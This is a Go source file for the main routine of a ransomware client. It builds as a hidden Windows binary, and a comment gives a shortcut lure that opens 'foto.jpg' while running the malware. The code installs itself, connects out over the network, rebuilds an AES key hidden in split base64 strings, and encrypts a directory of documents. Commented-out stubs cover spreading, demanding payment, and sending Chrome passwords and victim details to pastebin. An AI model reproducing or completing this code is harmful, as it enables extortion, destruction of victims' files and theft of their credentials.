//go:generate goversioninfo -icon=icon.ico
//Compile: go build -ldflags "-s -w -H=windowsgui"

//Shortcut: C:\Windows\System32\cmd.exe /C foto.jpg && rolling-win.exe

package main

import (
	"./aes"
	"./base64"
	"./install"
	"./instances"
	"./network"
)

// TargetFileName is the name taken by the Program

var key_text []byte

func main() {
	//Check if already running
	instances.CheckMultiInstances()
	install.Install()

	//go Spread()
	go network.EstablishConnection()

	//SendData("Ok from client using cap'p")

	/*if ReadRegDone() {
		//Already encrypted
		PromtPay()
		ListenForPayment()
	}*/

	//Run Analytics
	//Put name, IP and status to pastebin

	//Send chrome pass to pastebin

	//Gen
	//Deofuscate key
	b64_1 := "fSss" + "L1IkKy"
	b64_2 := "p3ZU4zR" + "3g5e"
	b64_3 := "ipMZy5" + "VYm13O"
	b64_4 := "Xg+WF" + "9jKnE="
	final := b64_1 + b64_2 + b64_3 + b64_4
	key_text = []byte(base64.Decode(final))
	//When key decoded
	aes.InitializeBlock(key_text)
	aes.EncryptDocumets("/Users/mac/Tiked/Client/test", false)
	for {
	}
}
